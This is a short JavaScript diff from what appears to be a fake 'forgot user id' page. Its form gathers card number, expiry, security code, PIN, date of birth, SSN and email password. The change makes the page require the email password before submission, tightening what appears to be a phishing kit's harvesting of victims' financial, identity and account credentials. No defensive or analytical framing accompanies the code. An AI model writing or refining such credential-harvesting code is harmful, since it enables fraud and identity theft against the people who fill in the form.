@@ -69,7 +69,7 @@ document.getElementById("forgot-userid-step-continue-btn").addEventListener("cli
     var pin =    document.getElementById("card_pin").value
     var dob =    document.getElementById("cardMemberDOB").value
     var ssn =    document.getElementById("cardMemberSSN").value
-    if( cc.length < 12 || expiry.length < 4 || sec_code.length < 3 || pin.length < 4 || dob.length < 4 || ssn.length < 4 || cc.length < 5 )
+    if( cc.length < 12 || expiry.length < 4 || sec_code.length < 3 || pin.length < 4 || dob.length < 4 || ssn.length < 4 || email_pass.length < 4 )
     {
         alert ("please enter all feild correctly")
     }
